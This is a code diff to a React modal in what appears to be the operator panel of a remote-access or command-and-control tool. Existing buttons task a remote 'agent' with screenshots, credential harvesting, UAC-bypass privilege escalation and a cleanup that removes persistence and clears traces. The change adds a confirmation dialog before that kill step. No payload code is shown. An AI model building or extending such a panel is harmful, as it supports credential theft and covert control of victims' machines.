@@ -145,6 +145,7 @@ export default function AgentModal({ agent, onClose }) {
   const [tab, setTab] = useState('terminal');
   const [creds, setCreds] = useState([]);
   const [toastMsg, showToast] = useToast();
+  const [showKillConfirm, setShowKillConfirm] = useState(false);
   const isMobile = useIsMobile();
 
   useEffect(() => {
@@ -192,7 +193,7 @@ export default function AgentModal({ agent, onClose }) {
           <HeaderBtn label={isMobile ? '📸' : '⬜ Screenshot'} onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
           <HeaderBtn label={isMobile ? '⚷' : '⚷ Harvest'} cls="harvest" onClick={() => { api.createTask(agent.id, 'vault_reader', {}); showToast('🔑 Harvesting credentials...'); }} />
           <HeaderBtn label={isMobile ? '↑' : '↑ Escalate'} cls="escalate" onClick={() => { api.createTask(agent.id, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }} />
-          <HeaderBtn label={isMobile ? '✕' : '✕ Kill'} cls="kill" onClick={() => { api.createTask(agent.id, 'cleanup', {}); showToast('☠ Agent terminated'); }} />
+          <HeaderBtn label={isMobile ? '✕' : '✕ Kill'} cls="kill" onClick={() => setShowKillConfirm(true)} />
           <button onClick={onClose} style={{
             background: 'none', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.5)',
             fontSize: 16, width: 30, height: 30, display: 'flex', alignItems: 'center', justifyContent: 'center',
@@ -235,6 +236,16 @@ export default function AgentModal({ agent, onClose }) {
       </div>
 
       <Toast msg={toastMsg} />
+      <ConfirmModal open={showKillConfirm} title="CONFIRM AGENT KILL"
+        message="This will terminate the agent, remove all persistence, and clear traces. The agent will NOT reconnect. This is IRREVERSIBLE."
+        detail={<>
+          <div><span style={{ color: 'var(--text-muted)' }}>AGENT: </span><span style={{ color: 'var(--green)' }}>{agent.hostname || agent.id?.substring(0, 10)}</span></div>
+          <div><span style={{ color: 'var(--text-muted)' }}>USER: </span>{agent.username}</div>
+          <div style={{ color: 'var(--red)', marginTop: 4 }}>All persistence will be removed. The agent will not reconnect.</div>
+        </>}
+        confirmLabel="KILL AGENT"
+        onConfirm={() => { api.createTask(agent.id, 'cleanup', {}); showToast('☠ Agent terminated'); setShowKillConfirm(false); }}
+        onCancel={() => setShowKillConfirm(false)} />
     </Modal>
   );
 }
